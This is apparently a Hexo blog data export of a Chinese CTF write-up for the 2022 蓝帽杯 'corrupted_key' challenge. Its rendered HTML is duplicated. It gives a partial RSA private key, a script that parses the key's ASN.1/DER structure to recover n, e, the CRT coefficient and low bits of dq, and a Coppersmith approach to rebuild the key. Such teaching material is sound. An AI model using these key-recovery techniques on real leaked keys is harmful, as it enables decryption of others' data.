进制就是 129 ，试了一下 6 - 134 号位用 `bytes_to_long` 解析出来的数据，也是 $n$\n那么现在你应该也可以尝试写出 $e$ 的编码：\n\n```plain\n\\x02\\x03\\x01\\x00\\x01\n```\n\n细心的你还发现我开头扔了 4 个字节，猜猜是啥呢？\n答案是整个私钥文件编码后作为值域前面补的标签域和长度域，最前面再补一个 0 ，也就是\n\n```plain\n0\\x82\\x02^\n```\n\n后两个字节 `bytes_to_long` 解码后是 606 ，恰为后面跟的完整数据的长度\n\n> 后来偶然间发现竟然有类似的题目（）\n[0CTF 2016 Quals equation](https://ctftime.org/task/2127)\n\n## 参考\n\n<https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQ>\n<https://www.likecs.com/show-40060.html>\n","slug":"2022蓝帽杯 - corrupted_key","published":1,"updated":"2022-11-27T11:46:26.512Z","_id":"clazajjqv0001yo6gdnpi8t2q","comments":1,"layout":"post","photos":[],"link":"","content":"<p>很有意思的一道题，涉及私钥文件的结构。</p>\n<span id=\"more\"></span>\n<hr>\n<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p>给了一个<code>priv.pem</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----BEGIN RSA PRIVATE KEY-----</span><br><span class=\"line\">MIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH</span><br><span class=\"line\">UFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm</span><br><span class=\"line\">dJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">yQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c</span><br><span class=\"line\">zUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==</span><br><span class=\"line\">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>\n\n<p>和一个加密的脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.PublicKey <span class=\"keyword\">import</span> RSA</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> PKCS1_OAEP</span><br><span class=\"line\"><span class=\"keyword\">from</span> secret <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"></span><br><span class=\"line\">key = RSA.generate(<span class=\"number\">1024</span>)</span><br><span class=\"line\"><span class=\"built_in\">open</span>(<span class=\"string\">&quot;flag.enc&quot;</span>,<span class=\"string\">&#x27;wb&#x27;</span>).write(PKCS1_OAEP.new(key.publickey()).encrypt(flag))</span><br><span class=\"line\"><span class=\"built_in\">open</span>(<span class=\"string\">&#x27;priv.pem&#x27;</span>,<span class=\"string\">&#x27;wb&#x27;</span>).write(key.exportKey(<span class=\"string\">&#x27;PEM&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<p>然后就是 <code>flag.enc</code></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><h3 id=\"数理部分\"><a href=\"#数理部分\" class=\"headerlink\" title=\"数理部分\"></a>数理部分</h3><p>题目名为 <strong>corrupted_key</strong> ，意为残损的私钥文件，既然是残损的，那么剩下的部分就是解题的关键了。<br>通过查看 <code>Crypto.PublicKey.RSA</code> 的源码，发现私钥文件的结构是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 （注意！！！！）</span><br><span class=\"line\">n</span><br><span class=\"line\">e</span><br><span class=\"line\">p</span><br><span class=\"line\">q</span><br><span class=\"line\">d mod (p-1)</span><br><span class=\"line\">d mod (q-1)</span><br><span class=\"line\">(inverse of q) mod p</span><br></pre></td></tr></table></figure>\n\n<p>完整来说是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RSAPrivateKey ::= SEQUENCE &#123;</span><br><span class=\"line\">version Version,</span><br><span class=\"line\">modulus INTEGER, -- n</span><br><span class=\"line\">publicExponent INTEGER, -- e</span><br><span class=\"line\">privateExponent INTEGER, -- d</span><br><span class=\"line\">prime1 INTEGER, -- p</span><br><span class=\"line\">prime2 INTEGER, -- q</span><br><span class=\"line\">exponent1 INTEGER, -- d mod (p-1)</span><br><span class=\"line\">exponent2 INTEGER, -- d mod (q-1)</span><br><span class=\"line\">coefficient INTEGER, -- (inverse of q) mod p</span><br><span class=\"line\">otherPrimeInfos OtherPrimeInfos OPTIONAL</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>一通操作后发现可以拿到 $n$,$e$,CRT 系数（即 $q^{-1}mod\\ p$ ）和 $d_q$ 低位，至于怎么拿到的等下再说，这里可以构造等式如下：<br>$$<br>    t = q^{-1} \\ (mod \\ p) \\\\<br>    tq-1 = 0 \\ (mod \\ p) \\\\<br>    tq^2 - q = 0 \\ (mod \\ n)<br>$$<br>然后<br>$$<br>    ed_q = 1 \\ (mod \\ q - 1) \\\\<br>    ed_q - 1 = k(q - 1) \\\\<br>    f = (dq_h + dq_l)e - 1 + k = kq<br>$$<br>代入得<br>$$<br>    tf^2 - kf = 0 \\ (mod \\ n)<br>$$<br>显然 $k$ 和 $e$ 数量级是相当的， $dq_h$ 的未知高位有512-120=392位，就可以通过 coppersmith 爆破 $k$ 。</p>\n<h3 id=\"参数提取\"><a href=\"#参数提取\" class=\"headerlink\" title=\"参数提取\"></a>参数提取</h3><p>然后就是有意思的部分了，如何从残损的私钥文件中提取参数呢？<br>对着源码一顿调试了几个钟（太菜了呜呜），发现是先将各个参数塞进一个首位为 0 的数组，然后各个参数前面补上长度，后面 <code>long_to_bytes</code> 转换成 bytes ，最后拼接起来。<br>我的提取脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> binascii <span class=\"keyword\">import</span> a2b_base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.asn1 <span class=\"keyword\">import</span> DerInteger</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\">pem = <span class=\"string\">&#x27;&#x27;&#x27;-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class=\"line\"><span class=\"string\">MIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH</span></span><br><span class=\"line\"><span class=\"string\">UFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm</span></span><br><span class=\"line\"><span class=\"string\">dJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">yQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c</span></span><br><span class=\"line\"><span class=\"string\">zUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==</span></span><br><span class=\"line\"><span class=\"string\">-----END RSA PRIVATE KEY-----&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">pemlist = pem.split(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">decode_b64 = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> pemlist[<span class=\"number\">1</span>:-<span class=\"number\">1</span>]:</span><br><span class=\"line\">    decode_b64+=a2b_base64(i)</span><br><span class=\"line\">decode_b64 = decode_b64[<span class=\"number\">4</span>:] <span class=\"comment\"># 丢弃前4个字节</span></span><br><span class=\"line\"></span><br><span class=\"line\">der_int = DerInteger()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取n</span></span><br><span class=\"line\">n = decode_b64[<span class=\"number\">3</span>:<span class=\"number\">135</span>]</span><br><span class=\"line\">der_int.decode(n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] n =&#x27;</span>,n:=der_int.value)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取e</span></span><br><span class=\"line\">e = decode_b64[<span class=\"number\">135</span>:<span class=\"number\">140</span>]</span><br><span class=\"line\">der_int.decode(e)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] e =&#x27;</span>,e:=der_int.value)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取CRT系数</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> <span class=\"built_in\">len</span> <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">300</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        q_inv_p = decode_b64[-<span class=\"built_in\">len</span>:]</span><br><span class=\"line\">        der_int.decode(q_inv_p)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] q_inv_p =&#x27;</span>,q_inv_p:=der_int.value)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"built_in\">len</span>+=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"comment\"># print(len)    # 67</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"comment\"># print(q_inv_p.bit_length())   # 512</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取dp低位</span></span><br><span class=\"line\">dp_l = decode_b64[-<span class=\"number\">82</span>:-<span class=\"number\">67</span>]</span><br><span class=\"line\"><span class=\"comment\"># print(dp_l)</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] dp_l =&#x27;</span>,bytes_to_long(dp_l))</span><br></pre></td></tr></table></figure>\n\n<p>可以看到我一开始直接把前 4 个字节丢了，然后在新 List 里用库函数解析 3 - 134 号位的数据，这部分就是属于 $n$ 的，然而实际上 <code>bytes_to_long</code> 解析 7 - 134 号位的数据得到的也是 $n$ ，那么问题来了， 3 - 6 号位这 4 个字节里放了啥？</p>\n<p>以下是新List：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\x02\\x01\\x00\\x02\\x81\\x81\\x00\\xd7\\x15%\\x06\\xaa\\x9c...</span><br></pre></td></tr></table></figure>\n\n<p>这里涉及一个<strong>ASN.1</strong>（Abstract Syntax Notation dot one，即抽象记法1）的问题，简单来说就是将数据编码成 3 个部分：<strong>标志域、长度域、值域</strong><br>标志域中，约定 02 表示整数<br>长度域稍微复杂些，记录的是值域的长度，分为定长和不定长两种情况<br>定长时，若值域长度不超过 127 ，则用<strong>短格式</strong>表示，也就是直接用 16 进制表示，比如长度为 31 就是 0x1F ，即 0001 1111 ；若长度超过 127 ，则用<strong>长格式</strong>表示，首字节的首位置 1 表示长格式，后面7位则表示后面再跟多少个表示长度的字节，比如 1000 0001 表示后面 1 个字节表示长度，后面的长度也是直接用 16 进制表示。<br>现在可以看到新 List 中， 0 号位为 02 表示整数， 1 号位 01 表示长度为 1 ， 2 号位 00 表示数据为 0 ，这就是上面提到的私钥文件结构中的那个 0 。<br>再继续分析， 3 号位 02 表示数据为整数， 4 号位中的首比特为1表示使用长格式，后面 7 个比特为 000 0001 意为数据长度用 1 个字节表示，没错就是后面紧跟的 5 号位，表示数据长度为 0x81 ，转换成 10 进制就是 129 ，试了一下 6 - 134 号位用 <code>bytes_to_long</code> 解析出来的数据，也是 $n$<br>那么现在你应该也可以尝试写出 $e$ 的编码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\x02\\x03\\x01\\x00\\x01</span><br></pre></td></tr></table></figure>\n\n<p>细心的你还发现我开头扔了 4 个字节，猜猜是啥呢？<br>答案是整个私钥文件编码后作为值域前面补的标签域和长度域，最前面再补一个 0 ，也就是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0\\x82\\x02^</span><br></pre></td></tr></table></figure>\n\n<p>后两个字节 <code>bytes_to_long</code> 解码后是 606 ，恰为后面跟的完整数据的长度</p>\n<blockquote>\n<p>后来偶然间发现竟然有类似的题目（）<br><a href=\"https://ctftime.org/task/2127\">0CTF 2016 Quals equation</a></p>\n</blockquote>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQ\">https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQ</a><br><a href=\"https://www.likecs.com/show-40060.html\">https://www.likecs.com/show-40060.html</a></p>\n","site":{"data":{}},"excerpt":"<p>很有意思的一道题，涉及私钥文件的结构。</p>","more":"<hr>\n<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p>给了一个<code>priv.pem</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----BEGIN RSA PRIVATE KEY-----</span><br><span class=\"line\">MIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH</span><br><span class=\"line\">UFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm</span><br><span class=\"line\">dJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">yQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c</span><br><span class=\"line\">zUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==</span><br><span class=\"line\">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>\n\n<p>和一个加密的脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.PublicKey <span class=\"keyword\">import</span> RSA</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> PKCS1_OAEP</span><br><span class=\"line\"><span class=\"keyword\">from</span> secret <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"></span><br><span class=\"line\">key = RSA.generate(<span class=\"number\">1024</span>)</span><br><span class=\"line\"><span class=\"built_in\">open</span>(<span class=\"string\">&quot;flag.enc&quot;</span>,<span class=\"string\">&#x27;wb&#x27;</span>).write(PKCS1_OAEP.new(key.publickey()).encrypt(flag))</span><br><span class=\"line\"><span class=\"built_in\">open</span>(<span class=\"string\">&#x27;priv.pem&#x27;</span>,<span class=\"string\">&#x27;wb&#x27;</span>).write(key.exportKey(<span class=\"string\">&#x27;PEM&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<p>然后就是 <code>flag.enc</code></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><h3 id=\"数理部分\"><a href=\"#数理部分\" class=\"headerlink\" title=\"数理部分\"></a>数理部分</h3><p>题目名为 <strong>corrupted_key</strong> ，意为残损的私钥文件，既然是残损的，那么剩下的部分就是解题的关键了。<br>通过查看 <code>Crypto.PublicKey.RSA</code> 的源码，发现私钥文件的结构是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 （注意！！！！）</span><br><span class=\"line\">n</span><br><span class=\"line\">e</span><br><span class=\"line\">p</span><br><span class=\"line\">q</span><br><span class=\"line\">d mod (p-1)</span><br><span class=\"line\">d mod (q-1)</span><br><span class=\"line\">(inverse of q) mod p</span><br></pre></td></tr></table></figure>\n\n<p>完整来说是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RSAPrivateKey ::= SEQUENCE &#123;</span><br><span class=\"line\">version Version,</span><br><span class=\"line\">modulus INTEGER, -- n</span><br><span class=\"line\">publicExponent INTEGER, -- e</span><br><span class=\"line\">privateExponent INTEGER, -- d</span><br><span class=\"line\">prime1 INTEGER, -- p</span><br><span class=\"line\">prime2 INTEGER, -- q</span><br><span class=\"line\">exponent1 INTEGER, -- d mod (p-1)</span><br><span class=\"line\">exponent2 INTEGER, -- d mod (q-1)</span><br><span class=\"line\">coefficient INTEGER, -- (inverse of q) mod p</span><br><span class=\"line\">otherPrimeInfos OtherPrimeInfos OPTIONAL</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>一通操作后发现可以拿到 $n$,$e$,CRT 系数（即 $q^{-1}mod\\ p$ ）和 $d_q$ 低位，至于怎么拿到的等下再说，这里可以构造等式如下：<br>$$<br>    t = q^{-1} \\ (mod \\ p) \\\\<br>    tq-1 = 0 \\ (mod \\ p) \\\\<br>    tq^2 - q = 0 \\ (mod \\ n)<br>$$<br>然后<br>$$<br>    ed_q = 1 \\ (mod \\ q - 1) \\\\<br>    ed_q - 1 = k(q - 1) \\\\<br>    f = (dq_h + dq_l)e - 1 + k = kq<br>$$<br>代入得<br>$$<br>    tf^2 - kf = 0 \\ (mod \\ n)<br>$$<br>显然 $k$ 和 $e$ 数量级是相当的， $dq_h$ 的未知高位有512-120=392位，就可以通过 coppersmith 爆破 $k$ 。</p>\n<h3 id=\"参数提取\"><a href=\"#参数提取\" class=\"headerlink\" title=\"参数提取\"></a>参数提取</h3><p>然后就是有意思的部分了，如何从残损的私钥文件中提取参数呢？<br>对着源码一顿调试了几个钟（太菜了呜呜），发现是先将各个参数塞进一个首位为 0 的数组，然后各个参数前面补上长度，后面 <code>long_to_bytes</code> 转换成 bytes ，最后拼接起来。<br>我的提取脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> binascii <span class=\"keyword\">import</span> a2b_base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.asn1 <span class=\"keyword\">import</span> DerInteger</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\">pem = <span class=\"string\">&#x27;&#x27;&#x27;-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class=\"line\"><span class=\"string\">MIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH</span></span><br><span class=\"line\"><span class=\"string\">UFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm</span></span><br><span class=\"line\"><span class=\"string\">dJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">yQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c</span></span><br><span class=\"line\"><span class=\"string\">zUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==</span></span><br><span class=\"line\"><span class=\"string\">-----END RSA PRIVATE KEY-----&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">pemlist = pem.split(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">decode_b64 = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> pemlist[<span class=\"number\">1</span>:-<span class=\"number\">1</span>]:</span><br><span class=\"line\">    decode_b64+=a2b_base64(i)</span><br><span class=\"line\">decode_b64 = decode_b64[<span class=\"number\">4</span>:] <span class=\"comment\"># 丢弃前4个字节</span></span><br><span class=\"line\"></span><br><span class=\"line\">der_int = DerInteger()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取n</span></span><br><span class=\"line\">n = decode_b64[<span class=\"number\">3</span>:<span class=\"number\">135</span>]</span><br><span class=\"line\">der_int.decode(n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] n =&#x27;</span>,n:=der_int.value)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取e</span></span><br><span class=\"line\">e = decode_b64[<span class=\"number\">135</span>:<span class=\"number\">140</span>]</span><br><span class=\"line\">der_int.decode(e)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] e =&#x27;</span>,e:=der_int.value)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取CRT系数</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> <span class=\"built_in\">len</span> <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">300</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        q_inv_p = decode_b64[-<span class=\"built_in\">len</span>:]</span><br><span class=\"line\">        der_int.decode(q_inv_p)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] q_inv_p =&#x27;</span>,q_inv_p:=der_int.value)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"built_in\">len</span>+=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"comment\"># print(len)    # 67</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"comment\"># print(q_inv_p.bit_length())   # 512</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取dp低位</span></span><br><span class=\"line\">dp_l = decode_b64[-<span class=\"number\">82</span>:-<span class=\"number\">67</span>]</span><br><span class=\"line\"><span class=\"comment\"># print(dp_l)</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] dp_l =&#x27;</span>,bytes_to_long(dp_l))</span><br></pre></td></tr></table></figure>\n\n<p>可以看到我一开始直接把前 4 个字节丢了，然后在新 List 里用库函数解析 3 - 134 号位的数据，这部分就是属于 $n$ 的，然而实际上 <code>bytes_to_long</code> 解析 7 - 134 号位的数据得到的也是 $n$ ，那么问题来了， 3 - 6 号位这 4 个字节里放了啥？</p>\n<p>以下是新List：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\x02\\x01\\x00\\x02\\x81\\x81\\x00\\xd7\\x15%\\x06\\xaa\\x9c...</span><br></pre></td></tr></table></figure>\n\n<p>这里涉及一个<strong>ASN.1</strong>（Abstract Syntax Notation dot one，即抽象记法1）的问题，简单来说就是将数据编码成 3 个部分：<strong>标志域、长度域、值域</strong><br>标志域中，约定 02 表示整数<br>长度域稍微复杂些，记录的是值域的长度，分为定长和不定长两种情况<br>定长时，若值域长度不超过 127 ，则用<strong>短格式</strong>表示，也就是直接用 16 进制表示，比如长度为 31 就是 0x1F ，即 0001 1111 ；若长度超过 127 ，则用<strong>长格式</strong>表示，首字节的首位置 1 表示长格式，后面7位则表示后面再跟多少个表示长度的字节，比如 1000 0001 表示后面 1 个字节表示长度，后面的长度也是直接用 16 进制表示。<br>现在可以看到新 List 